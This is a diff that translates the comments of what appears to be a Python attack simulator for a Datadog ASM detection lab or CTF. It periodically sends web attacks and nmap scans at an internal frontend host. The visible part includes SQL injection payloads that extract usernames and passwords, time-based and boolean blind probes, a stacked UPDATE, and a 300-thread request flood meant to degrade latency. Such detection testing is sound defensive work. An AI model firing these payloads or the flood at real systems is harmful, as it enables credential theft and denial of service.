@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Datadog AAP Attack Simulator
-定期的にフロントエンドに対して攻撃を実行し、Datadog AAPで検出されることを確認
+Periodically fires attack payloads at the frontend to be detected by Datadog ASM/AAP (CTF #44-46, #54-59)
 """
 import requests
 import time
@@ -20,18 +20,18 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ターゲット
+# Target frontend URL and timing configuration
 FRONTEND_URL = os.getenv('FRONTEND_URL', 'http://frontend')
-ATTACK_INTERVAL = int(os.getenv('ATTACK_INTERVAL', '60'))  # 通常攻撃の間隔（秒）
-LATENCY_ATTACK_INTERVAL = int(os.getenv('LATENCY_ATTACK_INTERVAL', '3600'))  # レイテンシー攻撃の間隔（秒）デフォルト1時間
+ATTACK_INTERVAL = int(os.getenv('ATTACK_INTERVAL', '60'))  # Interval between regular attack suites (seconds)
+LATENCY_ATTACK_INTERVAL = int(os.getenv('LATENCY_ATTACK_INTERVAL', '3600'))  # Interval between latency degradation attacks (seconds, default 1 hour)
 
 def log_attack(attack_name, success=True, details=""):
-    """攻撃ログを記録"""
+    """Log the result of an attack attempt."""
     status = "✅ SUCCESS" if success else "❌ FAILED"
     logger.info(f"{status} | {attack_name} | {details}")
 
 def attack_sql_injection():
-    """SQL Injection攻撃"""
+    """SQL Injection attack — detected by Datadog ASM (CTF #56-57)"""
     logger.info("🎯 SQL Injection Attack")
     
     payloads = [
@@ -54,7 +54,7 @@ def attack_sql_injection():
         time.sleep(1)
 
 def attack_xss():
-    """XSS (Cross-Site Scripting) 攻撃"""
+    """XSS (Cross-Site Scripting) attack — detected by Datadog ASM (CTF #54)"""
     logger.info("🎯 XSS Attack")
     
     payloads = [
@@ -78,7 +78,7 @@ def attack_xss():
         time.sleep(1)
 
 def attack_path_traversal():
-    """Path Traversal攻撃"""
+    """Path Traversal attack — detected by Datadog ASM"""
     logger.info("🎯 Path Traversal Attack")
     
     payloads = [
@@ -101,7 +101,7 @@ def attack_path_traversal():
         time.sleep(1)
 
 def attack_command_injection():
-    """Command Injection攻撃"""
+    """Command Injection attack — detected by Datadog ASM"""
     logger.info("🎯 Command Injection Attack")
     
     payloads = [
@@ -124,7 +124,7 @@ def attack_command_injection():
         time.sleep(1)
 
 def attack_ssrf():
-    """SSRF (Server-Side Request Forgery) 攻撃"""
+    """SSRF (Server-Side Request Forgery) attack — detected by Datadog ASM"""
     logger.info("🎯 SSRF Attack")
     
     payloads = [
@@ -148,7 +148,7 @@ def attack_ssrf():
         time.sleep(1)
 
 def attack_nosql_injection():
-    """NoSQL Injection攻撃"""
+    """NoSQL Injection attack — detected by Datadog ASM"""
     logger.info("🎯 NoSQL Injection Attack")
     
     payloads = [
@@ -170,7 +170,7 @@ def attack_nosql_injection():
         time.sleep(1)
 
 def attack_header_injection():
-    """HTTP Header Injection攻撃"""
+    """HTTP Header Injection attack — detected by Datadog ASM"""
     logger.info("🎯 Header Injection Attack")
     
     malicious_headers = [
@@ -194,11 +194,11 @@ def attack_header_injection():
         time.sleep(1)
 
 def attack_network_scan():
-    """ネットワークスキャン攻撃 (Nmap)"""
+    """Network scan attack using Nmap — detected by Datadog ASM"""
     logger.info("🎯 Network Scan (Nmap)")
     
     try:
-        # ポートスキャン
+        # Port scan
         result = subprocess.run(
             ["nmap", "-p", "80,443", "-sT", "frontend"],
             capture_output=True,
@@ -208,7 +208,7 @@ def attack_network_scan():
         
         time.sleep(2)
         
-        # サービスバージョン検出
+        # Service version detection
         result = subprocess.run(
             ["nmap", "-sV", "-p", "80", "frontend"],
             capture_output=True,
@@ -220,7 +220,7 @@ def attack_network_scan():
         log_attack("Network Scan", False, f"Error: {str(e)}")
 
 def attack_lfi():
-    """Local File Inclusion (LFI) 攻撃"""
+    """Local File Inclusion (LFI) attack — detected by Datadog ASM"""
     logger.info("🎯 LFI Attack")
     
     payloads = [
@@ -243,7 +243,7 @@ def attack_lfi():
         time.sleep(1)
 
 def attack_xxe():
-    """XXE (XML External Entity) 攻撃"""
+    """XXE (XML External Entity) attack — detected by Datadog ASM"""
     logger.info("🎯 XXE Attack")
     
     xxe_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
@@ -266,21 +266,16 @@ def attack_xxe():
 
 def attack_latency_degradation():
     """
-    SQL Injection攻撃による意図的なレイテンシー悪化
-    
-    攻撃フロー:
-    1. 複雑なSQLインジェクションペイロードを送信
-    2. データベースに高負荷をかける
-    3. AAPで検出される + レイテンシー悪化
-    
-    影響:
-    - Frontend: リクエスト処理遅延
-    - Database: CPU使用率上昇
-    - AAP: SQLインジェクション検出
-    
-    予想される影響:
-    - 通常レイテンシー: 10-50ms
-    - 攻撃時レイテンシー: 5000-20000ms (5-20秒)
+    Intentional latency degradation via heavy SQL Injection payloads (CTF #58-59)
+
+    Attack flow:
+    1. Send complex SQL injection payloads to the login and product endpoints
+    2. Overload the database with UNION, subquery, and time-based blind payloads
+    3. Detected by Datadog ASM + causes visible latency spike in APM
+
+    Expected impact:
+    - Normal latency: 10-50ms
+    - Attack latency: 5000-20000ms (5-20 seconds)
     """
     logger.info("=" * 70)
     logger.info("🔥 SQL INJECTION LATENCY ATTACK STARTED (EXTREME) 🔥")
@@ -298,37 +293,37 @@ def attack_latency_degradation():
     logger.info("   - AAP Detection: appsec-rl-000-002 (SQL injection)")
     logger.info("=" * 70)
     
-    attack_duration = 120  # 120秒間攻撃
+    attack_duration = 120  # Total attack window: 120 seconds
     start_time = time.time()
     
-    # 並列リクエスト数（大幅増加）
-    parallel_workers = 300  # 150 -> 300に倍増
+    # Number of parallel workers (doubled from original 150)
+    parallel_workers = 300
     
-    # 複雑なSQLインジェクションペイロード（データベースに高負荷）
+    # Heavy SQL injection payloads designed to overload the database
     HEAVY_SQL_PAYLOADS = [
-        # UNION-based injection (複数カラム取得、重い)
+        # UNION-based injection — extracts multiple columns, heavyweight
         "' UNION SELECT username, password, email, created_at, updated_at, id, role, status FROM users WHERE '1'='1",
         "' UNION SELECT table_name, column_name, data_type, character_maximum_length, is_nullable, column_default, ordinal_position, table_schema FROM information_schema.columns WHERE '1'='1",
         
-        # Time-based blind injection (意図的に遅延)
+        # Time-based blind injection — introduces intentional delays
         "' OR (SELECT COUNT(*) FROM users WHERE username LIKE '%admin%' AND SLEEP(5))--",
         "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
         "'; WAITFOR DELAY '00:00:05'--",
         
-        # Nested subqueries (処理が重い)
+        # Nested subqueries — expensive to evaluate
         "' OR EXISTS(SELECT * FROM users WHERE username IN (SELECT username FROM users WHERE role='admin'))--",
         "' UNION SELECT * FROM (SELECT username FROM users UNION SELECT email FROM users UNION SELECT password FROM users) AS combined--",
         
-        # Boolean-based blind (複数リクエスト必要、負荷大)
+        # Boolean-based blind — requires many requests, high load
         "' OR (SELECT COUNT(*) FROM users) > 0--",
         "' OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 10--",
         "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
         
-        # Stacked queries (複数クエリ実行)
+        # Stacked queries — attempts to execute multiple statements
         "'; SELECT * FROM users; SELECT * FROM orders; SELECT * FROM products;--",
         "'; UPDATE users SET last_login=NOW() WHERE username='admin';--",
         
-        # Heavy computation queries
+        # Heavy computation via Cartesian product
         "' OR 1=(SELECT COUNT(*) FROM users CROSS JOIN users CROSS JOIN users)--",
         "' UNION SELECT * FROM users WHERE username LIKE '%' AND password LIKE '%'--",
         
@@ -338,17 +333,14 @@ def attack_latency_degradation():
     ]
     
     def sql_injection_attacker():
-        """
-        SQLインジェクション攻撃を実行
-        複雑なペイロードでデータベースに高負荷をかける
-        """
+        """Execute a single SQL injection request with a random heavy payload."""
         attack_id = str(uuid.uuid4())[:8]
         
         try:
-            # ランダムなSQLインジェクションペイロードを選択
+            # Pick a random payload from the heavy payload list
             payload = random.choice(HEAVY_SQL_PAYLOADS)
             
-            # 複数のエンドポイントに攻撃（負荷分散）
+            # Spread attacks across multiple endpoints for broader load
             endpoints = [
                 f"/api/product/{payload}",
                 f"/product/{payload}",
@@ -361,7 +353,7 @@ def attack_latency_degradation():
             start_request_time = time.time()
             response = requests.get(
                 f"{FRONTEND_URL}{endpoint}",
-                timeout=60,  # 長いレイテンシーを許容
+                timeout=60,  # Allow long timeouts to capture full latency impact
                 allow_redirects=False
             )
             elapsed = time.time() - start_request_time
@@ -376,32 +368,30 @@ def attack_latency_degradation():
             log_attack("SQL Injection", False, f"ID: {attack_id}, Error: {str(e)}")
     
     def rapid_sql_injection_attacker():
-        """
-        高速連続SQLインジェクション攻撃（120秒間）
-        """
+        """Continuously fire SQL injection requests for the full attack duration (120 seconds)."""
         attack_count = 0
         while time.time() - start_time < attack_duration:
             sql_injection_attacker()
             attack_count += 1
-            time.sleep(0.005)  # 0.01秒 -> 0.005秒に短縮（さらに2倍速）
+            time.sleep(0.005)  # 200 requests/second per worker
         
         log_attack("Rapid SQL Injection", True, f"Completed {attack_count} attacks in {attack_duration}s")
     
-    # 並列でSQLインジェクション攻撃を実行
+    # Run all attackers in parallel
     with ThreadPoolExecutor(max_workers=parallel_workers) as executor:
         futures = []
         
-        # 一斉SQLインジェクション攻撃（ワンショット）大幅増加
+        # 150 one-shot attackers — immediate burst
         logger.info("💉 Launching 150 one-time SQL injection attackers...")
         for i in range(150):
             futures.append(executor.submit(sql_injection_attacker))
         
-        # 高速連続SQLインジェクション攻撃（120秒間）大幅増加
+        # 150 continuous attackers — sustained pressure for 120 seconds
         logger.info("🔥 Launching 150 rapid continuous SQL injection attackers...")
         for i in range(150):
             futures.append(executor.submit(rapid_sql_injection_attacker))
         
-        # 全タスクの完了を待つ（最大130秒）
+        # Wait for all tasks (max 130 seconds)
         completed = 0
         successful_attacks = 0
         failed_attacks = 0
@@ -439,7 +429,7 @@ def attack_latency_degradation():
     logger.info("=" * 70)
 
 def run_attack_suite():
-    """全攻撃を実行"""
+    """Run all attack types in sequence."""
     logger.info("=" * 60)
     logger.info(f"🚀 Starting Attack Suite at {datetime.now()}")
     logger.info(f"🎯 Target: {FRONTEND_URL}")
@@ -461,7 +451,7 @@ def run_attack_suite():
     for name, attack_func in attacks:
         try:
             attack_func()
-            time.sleep(2)  # 攻撃間の遅延
+            time.sleep(2)  # Brief pause between attack types
         except Exception as e:
             logger.error(f"❌ {name} failed: {str(e)}")
     
@@ -481,10 +471,10 @@ if __name__ == "__main__":
         try:
             current_time = time.time()
             
-            # 定期的な通常攻撃
+            # Regular attack suite
             run_attack_suite()
             
-            # 1時間ごとのレイテンシー悪化攻撃
+            # Scheduled latency degradation attack (every LATENCY_ATTACK_INTERVAL seconds)
             if current_time - last_latency_attack_time >= LATENCY_ATTACK_INTERVAL:
                 logger.info("")
                 logger.info("⏰ Time for scheduled latency degradation attack!")
